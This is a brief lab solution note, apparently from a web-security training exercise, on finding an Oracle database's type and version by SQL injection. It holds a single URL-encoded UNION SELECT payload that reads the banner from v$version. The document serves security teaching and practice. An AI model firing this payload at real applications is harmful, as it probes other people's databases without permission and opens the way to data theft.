# Lab: SQL injection attack, querying the database type and version on Oracle

## Objective
Perform the attack to solve SQL injection attack, querying the database type and version on Oracle.

## Payload
```text
'+UNION+SELECT+banner,+NULL+FROM+v$version--
```
